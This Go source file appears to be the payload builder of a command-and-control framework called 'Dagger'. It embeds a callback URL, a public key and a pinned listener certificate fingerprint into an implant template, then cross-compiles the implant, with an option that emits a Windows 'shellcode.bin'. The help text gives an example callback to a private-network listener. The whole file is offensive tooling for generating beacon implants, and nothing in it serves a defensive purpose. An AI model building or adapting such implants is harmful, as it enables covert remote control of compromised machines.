// Original code from https://levelup.gitconnected.com/writing-a-code-generator-in-go-420e69151ab1
// Prod

package main

import (
	"crypto/sha256"
	"crypto/x509"
	"embed"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"text/template"
	"uuid"
)

func StrH(s string) uint32 {
	var h uint32
	for _, c := range s {
		h = (h << 5) + uint32(c)
	}
	return h
}

var (
	//go:embed templates/*.tmpl
	rootFs embed.FS
)

type appValues struct {
	CallBack    string
	AppName     string
	UUID        string
	Pubkey      string
	ServerKey   string
	Fingerprint uint32
}

func calculatePublicKeyHash(publicKeyPEM []byte) (string, error) {
	// Decode the PEM-encoded public key
	block, _ := pem.Decode(publicKeyPEM)
	if block == nil {
		return "", fmt.Errorf("failed to decode PEM block containing public key")
	}

	// Parse the public key
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return "", fmt.Errorf("failed to parse certificate: %v", err)
	}

	// Calculate the SHA-256 hash of the raw public key bytes
	hash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)

	// Return the hex-encoded hash as a string
	return fmt.Sprintf("%x", hash), nil
}

func main() {
	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)

	if os.Args[1] == "help" {
		fmt.Printf("Need platform, architecture, output file name, and callback URL >>> ./builder windows amd64 tempExe http://192.168.1.179:8000\n")
		fmt.Printf("For a PIE, need platform, pie keyword, output file name, and callback URL >>> ./builder windows pie tempExe http://192.168.1.179:8000 \n")
		os.Exit(1)
	}

	mydir, _ := os.Getwd()
	var (
		err       error
		fp        *os.File
		templates *template.Template
	)

	values := appValues{}
	fmt.Printf("=|---> Dagger generator <---|= \n")

	// execute python script to generate keys
	genKey := exec.Command("python3", "crypter.py", uuid)
	out, err := genKey.Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Keys generated \n")
	// read the global key
	pubPEM, err := ioutil.ReadFile("../global.pub.pem")
	if err != nil {
		panic(err)
	}
	fmt.Printf("Keys read \n")
	//hash, _ := calculatePublicKeyHash(pubPEM)
	string_pem := string(pubPEM)
	string_pem_no_newLines := strings.Replace(string_pem, "\n", "", -1)
	// Here we need to trim the start and end from the string
	string_pem_no_newLines = string_pem_no_newLines[:len(string_pem_no_newLines)-24]
	string_pem_no_newLines = string_pem_no_newLines[26:len(string_pem_no_newLines)]

	certPEM, err := ioutil.ReadFile("../Listeners/testServer.crt")

	// I'm banging my head against a wall trying to trim the fingerprint in golang
	// let's do it in bash
	out, err = exec.Command("openssl", "x509", "-in", "../Listeners/testServer.crt", "-fingerprint", "-sha256").Output()
	if err != nil {
		log.Fatal(err)
	}
	// we've now got the output, so let's trim to the first line in Go
	outstr := string(out)
	lines := strings.Split(outstr, "\n")
	firstLine := lines[0]
	parts := strings.SplitAfterN(firstLine, "=", 2)
	res := parts[1]
	res = strings.ReplaceAll(res, ":", "")
	res = strings.ToLower(res)
	fmt.Printf(res)
	fmt.Printf("\n")
	// Get the string hash of the fingerprint
	sh := StrH(res)
	values.Fingerprint = sh

	string_cert := string(certPEM)
	//hash, _ := calculatePublicKeyHash(certPEM)
	string_cert_no_newLines := strings.Replace(string_cert, "\n", "", -1)
	//Here we need to trim the start and end from the string
	string_cert_no_newLines = string_cert_no_newLines[:len(string_cert_no_newLines)-25]
	string_cert_no_newLines = string_cert_no_newLines[27:len(string_cert_no_newLines)]

	values.CallBack = os.Args[4]
	values.AppName = os.Args[3]
	values.UUID = uuid
	values.Pubkey = string_pem_no_newLines
	values.ServerKey = string_cert_no_newLines

	rootFsMapping := map[string]string{
		"dagger.go.tmpl": mydir + "/templates/" + values.AppName + ".go",
	}
	fmt.Printf("Template mapped \n")
	/*
	 * Process templates
	 */
	if templates, err = template.ParseFS(rootFs, "templates/*.tmpl"); err != nil {
		log.Fatalln(err)
	}

	for templateName, outputPath := range rootFsMapping {
		if fp, err = os.Create(outputPath); err != nil {
			log.Fatalln(err)
		}

		defer fp.Close()

		if err = templates.ExecuteTemplate(fp, templateName, values); err != nil {
			log.Fatalln(err)
		}
	}
	fmt.Printf("Template executed \n")
	switch os.Args[2] {
	case "pie":
		fmt.Printf(" Generating PIE \n")
		os.Setenv("GOOS", "windows")
		os.Setenv("GOARCH", "amd64")
		appNamePath := mydir + "/templates/" + values.AppName + ".go"
		setEnvVarExec := exec.Command("go", "build", "-buildmode", "pie", "-o", "shellcode.bin", appNamePath)
		out, err = setEnvVarExec.Output()
		if err != nil {
			log.Fatal(err)
		}
		res := string(out)
		fmt.Printf(res)
		fmt.Printf(" Done, output shellcode.bin \n")

	default:
		// We set the app name and full path here for use later
		appNamePath := mydir + "/templates/" + values.AppName + ".go"
		// we set these as global compile options
		os.Setenv("GOOS", os.Args[1])
		os.Setenv("GOARCH", os.Args[2])
		fmt.Printf("Set env variables \n")

		// after setting environment variables, we compile using go build and the path to the file
		setEnvVarExec := exec.Command("go", "build", appNamePath)
		out, err = setEnvVarExec.Output()
		if err != nil {
			log.Fatal(err)
		}
		res := string(out)
		fmt.Printf(res)
		fmt.Printf(" Done \n")
	}
}
